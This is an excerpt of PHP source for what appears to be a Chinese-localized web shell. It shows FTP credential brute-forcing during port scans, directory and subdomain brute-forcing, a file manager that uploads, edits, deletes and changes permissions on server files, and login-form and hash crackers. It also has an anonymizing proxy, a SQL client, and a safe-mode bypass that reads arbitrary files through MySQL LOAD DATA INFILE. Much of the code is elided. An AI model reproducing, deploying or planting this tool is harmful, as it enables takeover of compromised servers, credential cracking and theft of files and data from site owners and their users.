...
function scanneR()
{
    ...
    if (($udp || $tcp) && !empty($_REQUEST['target']) && !empty($_REQUEST['fromport']) && !empty($_REQUEST['toport']) && !empty($_REQUEST['timeout']) && !empty($_REQUEST['portscanner'])) {
                    ...
                    foreach ($usps as $v) {
                        ...
                        if ($ftp) {
                            if (ftp_login($ftp, $user, $pass)) {
                                $output = 1;
                                echo "$ip) FTP结果: ($user:$pass) 系统类型: " . ftp_systype($ftp) . " (<b><a href='";
                                echo hlinK("seC=ftpc&workingdiR=" . getcwd() . "&hosT=$ip&useR=$user&pasS=$pass");
                                echo "' target='_blank'>连接</a></b>)<br>";
                            }
                        }
                    }
                }
        ...
        $host = $_REQUEST['host'];
        $r    = $_REQUEST['r1'];
        echo "<font color=blue><pre>扫描开始...\n";
        for ($i = 0; $i < count($dir); $i++) {
            $d = trim($dir[$i]);
            if ($r) {
                $adr = "http://$host/$d/";
                if (check_urL($adr, 'GET', '302')) {
                    echo "目录结果: <a href='$adr' target='_blank'>$adr</a>\n";
                }
            } else {
                $adr = "$d.$host";
                $ip  = gethostbyname($adr);
                if ($ip != $adr) {
                    echo "子域名结果: <a href='http://$adr' target='_blank'>$adr($ip)</a>\n";
                }
            }
        }
        echo '完成!</pre></font>';
...
function filemanageR()
{
    ...
    if (!empty($_REQUEST['task'])) {
        ...
        if (!empty($_FILES['uploadfile'])) {
            ...
            echo "$msgbox<b>上传完成!</b> 文件名: " . $_FILES['uploadfile']['name'] . " 文件大小: " . $_FILES['uploadfile']['size'] . "$et<br>";
        }
        ...
        echo "$table<form method='POST'><tr><td width='20%'><b>[ <a id='lk' style='text-decoration:none' href='#' onClick=\"HS('div');\">-</a> ] 路径:</b><input type=text name=workingdiR size=135 value='$cwd'><input class=buttons type=submit value=Change></form>$et";
        $file = $dir = $link = array();
        if ($dirhandle = opendir($cwd)) {
            ...
            sort($dir);
            sort($link);
            echo "<div id='div'><table border=1 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bordercolor='#282828' bgcolor='#333333' width='100%'><tr><td width='30%' bgcolor='#333333' align='center'>名称</td><td width='13%' bgcolor='#333333' align='center'>所有者</td><td width='12%' bgcolor='#333333' align='center'>修改时间</td><td width='12%' bgcolor='#333333' align='center'>最后修改</td><td width='5%' bgcolor='#333333' align='center'>权限</td><td width='7%' bgcolor='#333333' align='center'>大小</td><td width='15%' bgcolor='#333333' align='center'>动作</td></tr>";
            $i = 0;
            foreach ($dir as $dn) {
                echo '<tr>';
                $i++;
                ...
                $diraction = $select . hlinK('seC=fm&workingdiR=' . realpath($dn)) . "'>打开</option><option value='" . hlinK("seC=fm&workingdiR=$cwd&rN=$dn") . "'>改名</option><option value='" . hlinK("seC=fm&deL=$dn&workingdiR=$cwd") . "'>移除</option></select></td>";
                if ($owner)
            ...
            foreach ($file as $fn) {
                ...
                $fileaction = $select . hlinK("seC=openit&namE=$fn&workingdiR=$cwd") . "'>打开</option><option value='" . hlinK("seC=edit&filE=$fn&workingdiR=$cwd") . "'>编辑</option><option value='" . hlinK("seC=fm&downloaD=$fn&workingdiR=$cwd") . "'>下载</option><option value='" . hlinK("seC=hex&filE=$fn&workingdiR=$cwd") . "'>Hex 查看</option><option value='" . hlinK("seC=img&filE=$fn&workingdiR=$cwd") . "'>图片</option><option value='" . hlinK("seC=inc&filE=$fn&workingdiR=$cwd") . "'>Include</option><option value='" . hlinK("seC=checksum&filE=$fn&workingdiR=$cwd") . "'>Checksum</option><option value='" . hlinK("seC=fm&workingdiR=$cwd&cP=$fn") . "'>复制</option><option value='" . hlinK("seC=fm&workingdiR=$cwd&mV=$fn") . "'>移动</option><option value='" . hlinK("seC=fm&deL=$fn&workingdiR=$cwd") . "'>移除</option></select></td>";
                ...
                echo $cl1 . "$adate</td>";
                echo "</td>$cl1";
                echo "<a href='#' onClick=\"javascript:chmoD('$fn')\" title='更改权限'>";
                if (is_readable($fn))
                    echo "R";
                if (is_writeable($fn))
                    echo "W";
            ...
            foreach ($link as $ln) {
                ...
                $linkaction = $select . hlinK("seC=openit&namE=$ln&workingdiR=$ln") . "'>打开</option><option value='" . hlinK("seC=edit&filE=$ln&workingdiR=$cwd") . "'>编辑</option><option value='" . hlinK("seC=fm&downloaD=$ln&workingdiR=$cwd") . "'>下载</option><option value='" . hlinK("seC=hex&filE=$ln&workingdiR=$cwd") . "'>Hex view</option><option value='" . hlinK("seC=img&filE=$ln&workingdiR=$cwd") . "'>图片</option><option value='" . hlinK("seC=inc&filE=$ln&workingdiR=$cwd") . "'>Include</option><option value='" . hlinK("seC=checksum&filE=$ln&workingdiR=$cwd") . "'>Checksum</option><option value='" . hlinK("seC=fm&workingdiR=$cwd&cP=$ln") . "'>复制</option><option value='" . hlinK("seC=fm&workingdiR=$cwd&mV=$ln") . "'>移动</option><option value='" . hlinK("seC=fm&workingdiR=$cwd&rN=$ln") . "'>改名</option><option value='" . hlinK("seC=fm&deL=$ln&workingdiR=$cwd") . "'>移除</option></select></td>";
                ...
                echo $cl1 . "$adate</td>";
                echo "</td>${cl1}";
                echo "<a href='#' onClick=\"javascript:chmoD('$ln')\" title='更改权限'>L";
                if (is_readable($ln))
                    echo "R";
                if (is_writeable($ln))
                    echo "W";
        ...
        echo "</table></div>$table<tr><td><form method=POST>查找:<input type=text value='\$pass' name=search><input type=checkbox name=re value=1 style='border-width:1px;background-color:#333333;'>常用命令 <input type=submit class=buttons value='查找'>$hcwd<input type=hidden value=7 name=task></form></td><td><form method=POST>$hcwd<input type=hidden value='fm' name=seC><select name=task><option value=0>显示当前文件夹中的文件</option><option value=1>查找当前文件夹中的可写文件和目录</option><option value=2>查找当前文件中的可写文件</option><option value=3>查找当前文件夹中的可写目录</option><option value=4>显示当前文件夹中的所有文件</option><option value=5>显示当前文件夹中的所有目录</option></select><input type=submit class=buttons value='执行'></form>$et</tr></table><table width='100%'><tr><td width='50%'><br><table bgcolor=#333333 border=0 width='65%'><td><b>小结:</b> 共计: $total 个文件夹: $dc 个文件: $fc 条链接: $lc$et<table bgcolor=#333333 border=0 width='65%'><td width='100%' bgcolor=";
        if (is_writeable($cwd))
            echo '#006E00';
        elseif (!is_readable($cwd))
            echo '#800000';
        else
            '#333333';
        echo '>当前文件夹状态: ';
        ...
        if (is_writeable($cwd))
            echo 'W';
        echo "$et<table border=0 style='border-collapse: collapse' width='65%'><tr><td width='100%' bgcolor='#333333'>新建:</td></tr><tr>$td1n<form method='POST'><input type=text size=47 name=newf></td></tr><tr>$td2m$hcwd<input class=buttons type=submit name=newfile value='文件'><input class=buttons type=submit name=newdir value='文件夹'></form>$et</td><td width='50%'><br>${t}上传:</td></tr><tr>$td1n<form method='POST' enctype='multipart/form-data'><input type=file size=45 name=uploadfile></td></tr><tr>$td2m$hcwd<input class=buttons type=submit value='开始上传'></td></tr>$td1n 提示: 当前服务器允许上传的最大值为 $min</form>$et$et";
    }
}
...
function formcrackeR()
{
    ...
    if (!empty($_REQUEST['start'])) {
        ...
        if (!file_exists($dic))
            die("$errorbox 无法打开目录.$et$footer");
        $dictionary = fopen($dic, 'r');
        echo '<font color=blue>破解开始...<br>';
...
function hashcrackeR()
{
    ...
    if (!empty($_REQUEST['hash']) && !empty($_REQUEST['dictionary']) && !empty($_REQUEST['type'])) {
        ...
        if ($dictionary) {
            ...
            echo '<font color=blue>破解中 ' . htmlspecialchars($hash) . '...<br>';
            $type = ($_REQUEST['type'] == 'MD5') ? 'md5' : 'sha1';
            while (!feof($dictionary)) {
                $word = trim(fgets($dictionary), " \n\r");
                if ($hash == strtoupper(($type($word)))) {
                    echo "结果是 $word<br>";
                    if ($log)
            ...
            echo "$errorbox 无法打开目录.$et";
        }
    }
    echo "<center>${t}Hash 破解器:</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#666666'>目录:</td><td bgcolor='#666666'><input type=text name=dictionary size=35></td></tr><tr><td width='20%' bgcolor='#808080'>Hash:</td><td bgcolor='#808080'><input type=text name=hash size=35></td></tr><tr><td width='20%' bgcolor='#666666'>类型:</td><td bgcolor='#666666'><select name=type><option selected value=MD5>MD5</option><option value=SHA1>SHA1</option></select></td></tr><tr><td width='20%' bgcolor='#808080'><input type=checkbox name=loG value=1 onClick='document.form.logfilE.disabled = !document.form.logfilE.disabled;' style='border-width:1px;background-color:#808080;' checked>记录</td><td bgcolor='#808080'><input type=text name=logfilE size=25 value='" . whereistmP() . DIRECTORY_SEPARATOR . ".log'> $hcwd <input class=buttons type=submit value='开始'></form>$et</center>";
}
function pr0xy()
{
    global $errorbox, $et, $footer, $hcwd;
    echo "<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><form method='POST'><tr><td width='20%'><b>目标站点: </b><input type=text name=urL size=140 value='";
    if (!!empty($_REQUEST['urL']))
        echo 'http://www.123cha.com';
    else
    ...
    if (!empty($_REQUEST['urL'])) {
        ...
        $s    = array(
            ...
            "href=\'mailto" => "HrEf=\"mailto",
            "HREF=\'mailto" => "HrEf=\"mailto",
            "href=\"http" => "HrEf=\"" . hlinK("seC=px&urL=http"),
            "href=\'http" => "HrEf=\"" . hlinK("seC=px&urL=http"),
            "HREF=\'http" => "HrEf=\"" . hlinK("seC=px&urL=http"),
            "href=http" => "HrEf=" . hlinK("seC=px&urL=http"),
            "HREF=http" => "HrEf=" . hlinK("seC=px&urL=http"),
            "href=\"" => "HrEf=\"" . hlinK("seC=px&urL=http://$host/$dir/"),
            "HREF=\"" => "HrEf=\"" . hlinK("seC=px&urL=http://$host/$dir/"),
            "href=\"" => "HrEf=\'" . hlinK("seC=px&urL=http://$host/$dir/"),
            'HREF="' => 'HrEf="' . hlinK("seC=px&urL=http://$host/$dir/"),
            "href=" => "HrEf=" . hlinK("seC=px&urL=http://$host/$dir/"),
...
function sqlclienT()
{
    ...
    if (empty($_REQUEST['typE']))
        $_REQUEST['typE'] = '';
    echo "<center>${t}数据库程序:</td><form name=client method='POST'><td bgcolor='#333333'><select name=typE><option valut=MySQL onClick='document.client.serveR.disabled = false;' ";
    ...
    if ($_REQUEST['typE'] == 'PostgreSQL')
        echo 'selected';
    echo ">PostgreSQL</option></select></td></tr><tr><td width='20%' bgcolor='#666666'>服务器:</td><td bgcolor='#666666'><input type=text value='";
    if (!empty($_REQUEST['serveR']))
        echo htmlspecialchars($_REQUEST['serveR']);
    else
        echo 'localhost';
    echo "' name=serveR size=35></td></tr><tr><td width='20%' bgcolor='#808080'>用户名:</td><td bgcolor='#808080'><input type=text name=useR value='";
    if (!empty($_REQUEST['useR']))
        echo htmlspecialchars($_REQUEST['useR']);
    else
        echo 'root';
    echo "' size=35></td><tr><td width='20%' bgcolor='#666666'>密  码:</td><td bgcolor='#666666'><input type=text value='";
    if (isset($_REQUEST['pasS']))
        echo htmlspecialchars($_REQUEST['pasS']);
    else
        echo '123456';
    echo "' name=pasS size=35></td></tr><tr><td width='20%' bgcolor='#808080'>数据库:</td><td bgcolor='#808080'><input type=text value='";
    if (!empty($_REQUEST['dB']))
        echo htmlspecialchars($_REQUEST['dB']);
    echo "' name=dB size=35></td><tr><td width='20%' bgcolor='#666666'>查  询:</td><td bgcolor='#666666'><textarea name=querY rows=5 cols=27>";
    if (!empty($_REQUEST['querY']))
        echo htmlspecialchars(($_REQUEST['querY']));
    else
        echo 'SHOW DATABASES';
    echo "</textarea></td></tr></tr><tr><td width='20%' bgcolor='#808080'></td><td bgcolor='#808080' align=right>$hcwd<input class=buttons type=submit value='提交查询'></form>$et</center>";
}
...
function toolS()
{
    ...
    if (!empty($_REQUEST['serveR']) && !empty($_REQUEST['domaiN'])) {
        ...
        echo '<font color=blue>完成</font>';
    }
    $s = "</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#666666'>";
    echo "<center>${t}WhoIs:${s}服务器:</td><td bgcolor='#666666'><input type=text value='";
    if (!empty($_REQUEST['serveR']))
        echo htmlspecialchars($_REQUEST['serveR']);
    else
        echo 'whois.geektools.com';
    echo "' name=serveR size=35></td></tr><tr><td width='20%' bgcolor='#808080'>域名:</td><td bgcolor='#808080'><input type=text name=domaiN value='";
    if (!empty($_REQUEST['domaiN']))
        echo htmlspecialchars($_REQUEST['domaiN']);
    else
        echo 'google.com';
    echo "' size=35></td><tr><td bgcolor='#666666'></td><td bgcolor='#666666' align=right>$hcwd<input class=buttons type=submit value='操作'></form>$et<br>${t}.ht* 生成器:${s}用户名:</td><td bgcolor='#666666'><input type=text value='";
    if (!empty($_REQUEST['uN']))
        echo htmlspecialchars($_REQUEST['uN']);
    else
        echo 'r00t';
    echo "' name=uN size=35></td></tr><tr><td width='20%' bgcolor='#808080'>密码:</td><td bgcolor='#808080'><input type=text name=pW value='";
    if (!empty($_REQUEST['pW']))
        echo htmlspecialchars($_REQUEST['pW']);
    else
        echo uniqid('@');
    echo "' size=35></td><tr><td width='20%' bgcolor='#666666'>目录:</td><td bgcolor='#666666'><input type=text name=ouT value='";
    if (!empty($_REQUEST['ouT']))
        echo htmlspecialchars($_REQUEST['ouT']);
    else
        echo $cwd;
    echo "' size=35></td><tr><td bgcolor='#808080'></td><td bgcolor='#808080' align=right>$hcwd<input class=buttons type=submit value='生成'></form>$et<br>${t}Grab header:${s}URL:</td><td bgcolor='#666666'><input type=text value='";
    if (!empty($_REQUEST['urL']))
        echo htmlspecialchars($_REQUEST['urL']);
    else
        echo 'http://netjackal.by.ru/index.htm';
...
function safemodE()
{
    ...
    if (!empty($_REQUEST['read'])) {
        ...
        $ta = uniqid('N');
        $s  = array(
            "CREATE TEMPORARY TABLE $ta (file LONGBLOB)",
            "LOAD DATA INFILE '" . addslashes($_REQUEST['file']) . "' INTO TABLE $ta",
            "SELECT * FROM $ta"
        );
    ...
    if (!empty($_REQUEST['hosT']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && function_exists('ftp_connect')) {
        ...
        if ($con) {
            ...
            if ($ftp) {
                ...
                $dir = ftp_nlist($con, '');
                $d   = opendir($cwd);
                echo "<table border=0 style='border-collapse: collapse' width='100%'><tr>${td}服务器:</td>${td}Client:</td></tr><form method=POST><tr>$td<input type=text value='$pwd' name=PWD size=50><input value='变更' class=buttons type=submit></td>$td<input size=50 type=text value='$cwd' name=workingdiR><input value=Change class=buttons type=submit></td></tr><tr>$td";
                foreach ($dir as $n)
                    echo "$n<br>";
                echo "</td>$td";
                while ($cdir = readdir($d))
                    if ($cdir != '.' && $cdir != '..')
                        echo "$cdir<br>";
                echo "</td></tr><tr>${td}名称:<input type=text name=filE><input type=checkbox style='border-width:1px;background-color:#333333;' name=modE value=1>二进制 <input type=submit name=geT class=buttons value=Get><input type=submit name=puT class=buttons value=Put><input type=submit name=rM class=buttons value=Remove><input type=submit name=mD class=buttons value='Make dir'></td>$td<input type=hidden value='$user' name=useR><input type=hidden value='$pass' name=pasS><input type=hidden value='$host' name=hosT></form>$et";
            } else
                echo "$errorbox 错误的用户名或者密码$et";
        } else
            echo "$errorbox 无法连接到服务器!$et";
    } else {
        echo "<center>${t}FTP 登录器:</td><form name=client method='POST'><td bgcolor='#333333'></td></tr><tr><td width='20%' bgcolor='#666666'>服务器:</td><td bgcolor='#666666'><input type=text value=localhost name=hosT size=35></td></tr><tr><td width='20%' bgcolor='#808080'>用户名:</td><td bgcolor='#808080'><input type=text name=useR value=anonymous size=35></td><tr><td width='20%' bgcolor='#666666'>密码:</td><td bgcolor='#666666'><input type=text value=admin@nasa.gov name=pasS size=35></td></tr><tr><td width='20%' bgcolor='#808080'></td><td bgcolor='#808080' align=right>$hcwd<input class=buttons type=submit value='连接'></form>$et</center>";
    }
}
function calC()
{
    ...
    echo "<center>${t}转换器:</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#666666'>输入:</td><td bgcolor='#666666'><textarea rows='10' name='input' cols='64'>";
...
function openiT($name)
{
    ...
    if (in_array($ext, $src))
        ...
        echo '<font color=blue><pre>' . htmlspecialchars(file_get_contents($name)) . '</pre></font>';
}
